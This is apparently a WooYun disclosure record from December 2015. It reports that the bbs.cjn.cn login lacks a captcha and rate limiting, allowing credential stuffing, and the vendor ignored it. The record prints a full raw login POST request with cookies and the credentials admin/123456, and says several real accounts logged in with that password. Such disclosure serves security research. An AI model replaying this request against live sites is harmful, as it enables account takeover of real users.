wybug_title: 长江网主站设计不当导致撞库
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-14：	细节已通知厂商并且等待厂商处理中									2015-12-19：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 长江网主站设计不当导致撞库 详细说明：  http://www.cjn.cn/没有验证码没有次数限制密码明文提交POST /login.php?nowtime=1449898803339&verify=9b42997d HTTP/1.1Host: bbs.cjn.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://bbs.cjn.cn/index.php?m=area&alias=ladyCookie: Hm_lvt_c63a40067785e1a6ff862dff1073e06a=1449898012,1449898061,1449898368,1449898786; Hm_lpvt_c63a40067785e1a6ff862dff1073e06a=1449898786; 278f3_lastpos=bbs; 278f3_ol_offset=589566; 278f3_ipstate=1449897615; city_c=101280800; 278f3_readlog=%2C22139839%2C; 278f3_cloudcksessionid=934faf25f8a7d064ed5b611f217fa4e9; 278f3_cloudClientUid=53505053; CNZZDATA1849402=cnzz_eid%3D1202110352-1449897787-http%253A%252F%252Fbbs.cjn.cn%252F%26ntime%3D1449897787; 278f3_jobpop=0; 278f3_lastvisit=1%091449898813%09%2Fmode.php%3Fmarea%26qstatic%26typeautostatic%26aliasladyConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 125jumpurl=http%3A%2F%2Fbbs.cjn.cn%2Findex.php%3Fm%3Darea%26alias%3Dlady&step=2&cktime=31536000&ajax=1&pwuser=admin&pwpwd=123456随便跑了下下图这些都是成功的密码都是123456
